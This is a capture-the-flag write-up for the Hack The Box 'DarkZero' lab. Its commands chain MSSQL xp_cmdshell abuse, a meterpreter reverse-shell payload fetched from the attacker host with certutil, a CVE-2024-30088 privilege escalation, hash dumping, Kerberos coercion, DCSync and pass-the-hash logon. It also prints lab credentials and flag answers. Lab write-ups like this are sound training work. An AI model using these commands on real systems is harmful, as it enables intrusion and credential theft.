# Hack The Box — DarkZero (Hard) — Write‑Up 

> 1) Enumerate MSSQL → find linked server
> 2) Enable xp_cmdshell → remote command exec
> 3) Host + deliver payload → get meterpreter
> 4) Exploit CVE‑2024‑30088 → SYSTEM
> 5) Dump hashes + Kerberos abuse
> 6) WinRM logon → flags

---

I added the domain mapping for resolution.

```bash
echo "10.129.26.13 DC01.darkzero.htb DC01 darkzero.htb" >> sudo tee -a /etc/hosts
```

---

## MSSQL Access & Linked Server Discovery
I authenticated to MSSQL and enumerated the linked server.

```text
impacket-mssqlclient john.w@dc01.darkzero.htb -windows-auth
...
SQL (darkzero\john.w  guest@master)> enum_links
...
```

---

## Enable xp_cmdshell on Linked Server
I enabled xp_cmdshell remotely to execute OS commands.

```sql
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell "whoami"') AT [DC02.darkzero.ext]
...
```

---

## Payload Creation & Hosting
I generated a meterpreter payload and served it.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.73 LPORT=9999 -f exe -o reverse.exe
python3 -m http.server 8000
...
```

---

## Remote Retrieval + Execution
I instructed xp_cmdshell to download and run the payload.

```sql
EXEC ('xp_cmdshell "certutil -urlcache -f http://10.10.14.73:8000/reverse.exe C:\\Users\\Public\\reverse.exe"') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell "C:\\Users\\Public\\reverse.exe"') AT [DC02.darkzero.ext]
...
```

---

## Meterpreter Access
I caught a reverse shell and verified account context.

```text
msf exploit(multi/handler) > run
...
whoami
darkzero-ext\svc_sql
```

---

## Privilege Escalation (CVE‑2024‑30088)
I abused the vulnerable authorisation component to escalate to SYSTEM.

```text
use exploit/windows/local/cve_2024_30088_authz_basep
set SESSION 4
...
whoami
nt authority\system
```

---

## Hash Dump + User Flag
I dumped credential material and retrieved the user flag.

```text
hashdump
...
cd C:\Users\Administrator\Desktop
type user.txt
19f415c90328323faadefef19c539ab3
```

---

## Kerberos Monitoring (Rubeus)
I uploaded Rubeus to monitor for TGT material.

```text
upload Rubeus.exe C:\\Windows\\Temp
.\Rubeus.exe monitor /interval:5 /nowrap
...
```

---

## Forced Authentication (Coercer)
I triggered coercion to influence Kerberos activity.

```bash
coercer coerce -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -l DC02.darkzero.ext -t 10.129.26.13
...
```

---

## Ticket Conversion
I converted the captured Kerberos ticket for use.

```bash
echo "<BASE64_KIRBI>" | base64 -d > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache
```

---

## DCSync / Secrets Dump
I used DRSUAPI to dump domain credentials.

```text
impacket-secretsdump -k -no-pass -just-dc DC01.darkzero.htb
...
```

---

## WinRM → Administrator Session
I authenticated with the Administrator hash and retrieved the flags.

```bash
evil-winrm -i 10.129.26.13 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
cd C:\Users\Administrator\Desktop
type root.txt
type user.txt
```

---

## Flags
- `user.txt`: `19f415c90328323faadefef19c539ab3`
- `root.txt`: `939854ef74759c980480429f6df91139`

---



